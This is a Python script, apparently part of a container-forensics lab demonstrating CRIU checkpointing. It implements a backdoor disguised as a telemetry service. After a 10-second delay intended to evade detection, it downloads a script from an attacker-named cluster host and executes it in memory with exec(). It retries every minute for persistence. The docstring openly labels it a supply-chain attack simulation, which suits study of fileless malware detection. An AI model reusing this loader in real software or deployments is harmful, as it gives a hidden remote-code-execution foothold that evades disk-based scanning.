#!/usr/bin/env python3
"""
Telemetry Service - Metrics Collection
(This is actually a malicious binary disguised as telemetry)

SUPPLY CHAIN ATTACK SIMULATION:
This file represents a backdoor that was injected into the container image
during the build process - perhaps via a compromised base image, a malicious
dependency, or a compromised CI/CD pipeline.

It masquerades as a legitimate telemetry/metrics collector but actually:
1. Waits for 10 seconds after startup (to avoid initial detection)
2. Downloads a malicious script from an attacker-controlled server
3. Executes the script entirely in memory (never writes to disk)

The fileless execution means:
- No file on disk to scan
- No file hash to detect
- Traditional forensics won't find it
- BUT: CRIU checkpoint captures the script from process memory!
"""
import os
import sys
import time
import urllib.request

# Configuration disguised as telemetry endpoints
TELEMETRY_ENDPOINT = "http://payload-server.malicious-cdn.svc.cluster.local:8080"
METRICS_PATH = "/payload"
COLLECTION_DELAY = 10  # Wait 10 seconds before "collecting metrics"

def log(msg):
    """Log messages to stderr"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] [telemetry] {msg}", file=sys.stderr)

def collect_metrics():
    """
    Disguised as metrics collection - actually downloads and executes malware
    """
    log("Starting metrics collection...")

    # The URL looks like a metrics endpoint but serves malicious code
    payload_url = f"{TELEMETRY_ENDPOINT}{METRICS_PATH}"

    try:
        log(f"Fetching metrics from {payload_url}...")

        # Download the script
        req = urllib.request.Request(payload_url)
        with urllib.request.urlopen(req, timeout=30) as response:
            # Read the script into memory - never written to disk
            script_content = response.read().decode('utf-8')

            log(f"Received {len(script_content)} bytes of 'metrics configuration'")

            # ================================================================
            # FILELESS EXECUTION
            # The script is executed directly from memory using exec()
            # This is the key technique:
            # - script_content is a Python string in memory
            # - exec() compiles and runs it without touching disk
            # - CRIU will capture this string from process memory
            # ================================================================

            log("Processing metrics configuration...")

            # Execute the downloaded script in memory
            # The script content lives only in the 'script_content' variable
            # and in the Python interpreter's compiled bytecode
            exec(script_content, {'__name__': '__main__'})

    except Exception as e:
        log(f"Metrics collection failed: {e}")
        # Keep trying - persistence
        time.sleep(60)
        collect_metrics()

def main():
    """Main entry point - looks like a normal service startup"""
    log("Telemetry service initializing...")
    log(f"PID: {os.getpid()}")
    log(f"Collection interval: {COLLECTION_DELAY}s")

    # Wait before activation - evades initial detection
    log(f"Waiting {COLLECTION_DELAY}s for system stabilization...")
    time.sleep(COLLECTION_DELAY)

    log("System stable - beginning metrics collection")
    collect_metrics()

    # Keep the process alive
    while True:
        time.sleep(3600)

if __name__ == '__main__':
    main()
